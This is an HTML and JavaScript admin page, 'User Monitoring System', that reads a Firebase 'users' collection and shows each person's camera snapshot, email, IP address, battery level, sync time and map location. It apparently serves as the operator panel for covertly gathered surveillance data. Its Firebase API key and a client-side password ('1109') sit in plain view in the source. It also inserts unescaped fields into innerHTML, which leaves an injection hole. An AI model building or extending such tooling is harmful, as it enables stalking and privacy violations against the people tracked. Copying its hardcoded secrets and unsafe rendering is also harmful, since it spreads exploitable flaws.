<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Control | Ratan Bro</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --pink: #ff4d94;
            --dark: #020617;
            --card: #1e293b;
        }

        body {
            font-family: 'Hind Siliguri', sans-serif;
            background: var(--dark);
            color: white;
            margin: 0;
            padding-bottom: 50px;
        }

        /* Login Security */
        #admin-lock {
            position: fixed;
            inset: 0;
            background: var(--dark);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .lock-box {
            background: var(--card);
            padding: 40px;
            border-radius: 30px;
            border: 2px solid var(--pink);
            text-align: center;
            width: 90%;
            max-width: 380px;
        }

        header {
            background: var(--pink);
            padding: 20px;
            text-align: center;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .container {
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .user-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 20px;
        }

        .user-card {
            background: var(--card);
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid #334155;
            transition: 0.3s;
        }

        .user-card:hover {
            border-color: var(--pink);
            transform: translateY(-5px);
        }

        .snapshot-img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            background: #000;
            border-bottom: 2px solid var(--pink);
        }

        .user-info {
            padding: 20px;
        }

        .user-info h3 {
            color: var(--pink);
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .user-info img.avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--pink);
        }

        .detail {
            display: flex;
            justify-content: space-between;
            font-size: 0.9rem;
            padding: 5px 0;
            border-bottom: 1px solid #334155;
        }

        .label {
            color: #94a3b8;
        }

        .btn-map {
            display: block;
            background: var(--pink);
            color: white;
            text-align: center;
            padding: 10px;
            border-radius: 10px;
            text-decoration: none;
            margin-top: 15px;
            font-weight: bold;
        }

        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 20px 0;
            border-radius: 10px;
            border: none;
            outline: none;
            text-align: center;
            font-size: 1.2rem;
            background: #0f172a;
            color: white;
        }
    </style>
</head>

<body>

    <div id="admin-lock">
        <div class="lock-box">
            <i class="fas fa-user-shield" style="font-size: 3rem; color: var(--pink);"></i>
            <h2 style="margin-top:15px;">Admin Login</h2>
            <input type="password" id="passInput" placeholder="Enter Password">
            <button onclick="unlock()"
                style="background:var(--pink); color:white; border:none; padding:10px 30px; border-radius:50px; cursor:pointer; width:100%; font-weight:bold;">Login</button>
        </div>
    </div>

    <header>
        <h1><i class="fas fa-ghost"></i> User Monitoring System</h1>
    </header>

    <div class="container">
        <div class="user-grid" id="user-display">
            <p style="text-align:center;">ডাটা লোড হচ্ছে...</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // আনলক লজিক (Password: 1109)
        window.unlock = () => {
            const pass = document.getElementById('passInput').value;
            if (pass === "1109") {
                document.getElementById('admin-lock').style.display = 'none';
                loadUsers();
            } else {
                alert("Wrong Password!");
            }
        };

        function loadUsers() {
            const q = query(collection(db, "users"));
            onSnapshot(q, (snapshot) => {
                const display = document.getElementById('user-display');
                display.innerHTML = '';

                snapshot.forEach((doc) => {
                    const data = doc.data();
                    const googleMapUrl = `https://www.google.com/maps?q=${data.location}`;

                    display.innerHTML += `
                        <div class="user-card">
                            <img src="${data.lastPic || 'https://via.placeholder.com/640x480?text=No+Snapshot'}" class="snapshot-img">
                            <div class="user-info">
                                <h3><img src="${data.photo}" class="avatar"> ${data.name}</h3>
                                <div class="detail"><span class="label">Email:</span> <span>${data.email}</span></div>
                                <div class="detail"><span class="label">IP:</span> <span style="color:var(--pink)">${data.ip}</span></div>
                                <div class="detail"><span class="label">Battery:</span> <span>${data.battery}</span></div>
                                <div class="detail"><span class="label">Last Sync:</span> <span>${data.time}</span></div>
                                <a href="${googleMapUrl}" target="_blank" class="btn-map">
                                    <i class="fas fa-map-marked-alt"></i> View Location
                                </a>
                            </div>
                        </div>
                    `;
                });
            });
        }
    </script>
</body>

</html>
